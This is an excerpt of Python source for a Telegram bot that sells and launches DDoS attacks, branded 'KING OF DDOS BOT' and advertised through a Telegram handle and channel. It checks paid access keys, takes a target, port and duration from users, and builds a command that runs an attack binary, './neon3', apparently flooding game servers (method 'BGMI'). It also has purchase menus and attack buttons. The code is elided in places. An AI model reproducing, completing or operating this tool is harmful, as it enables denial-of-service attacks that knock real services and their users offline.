...
def authorize_user(message, func):
    ...
    if is_key_valid(message.text):
        ...
        bot.reply_to(message, "🚫KEY EXPIRED OR INVALID❌ GET NEW KEY 🔑 @NEONxCHEATZ3✅.")    
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"𝐊𝐈𝐍𝐆 𝐎𝐅 𝐃𝐃𝐎𝐒 𝐁𝐎𝐓\n\n@NEONxCHEATZ3,𝐒𝐓𝐀𝐑𝐓𝐄𝐃 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} Seconds\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
    bot.reply_to(message, response)
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 181:
                ...
                full_command = f"./neon3 {target} {port} {time} 200"
...
Buy From :- @NEONxCHEATZ3

Official Channel :- https://t.me/+YrWcZVAVyYNmNTM1
'''
...
➡️ To Start neon Ddos Attack  : /bgmi
    
➡️ To Run This Command : /settings 

➡️ Join Telegram :- @NEONxCHEATZ3'''
...
def set_bot_commands():
    ...
    BotCommand("id", "Get User ID"),
        ...
        BotCommand("bgmi", "START neon DDOS ATTACK"),
...
def create_user_keyboard():
    ...
    button1 = KeyboardButton("♻️ START neon DDOS ATTACK ♻️")
...
@bot.message_handler(func=lambda message: message.text in ["♻️ START neon DDOS ATTACK ♻️", "RULES ℹ️", "MY LOGS 📝", "HELP ❓", "BUY PLAN 🛒"])
def handle_user_buttons(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        if message.text == "♻️ START neon DDOS ATTACK ♻️":
            handle_bgmi(message)
...
@bot.message_handler(func=lambda message: message.text in ["♻️ START neon DDOS ATTACK ♻️", "LOGS 📊", "ALL USERS 👥", "CLEAR LOGS 🗑️"])
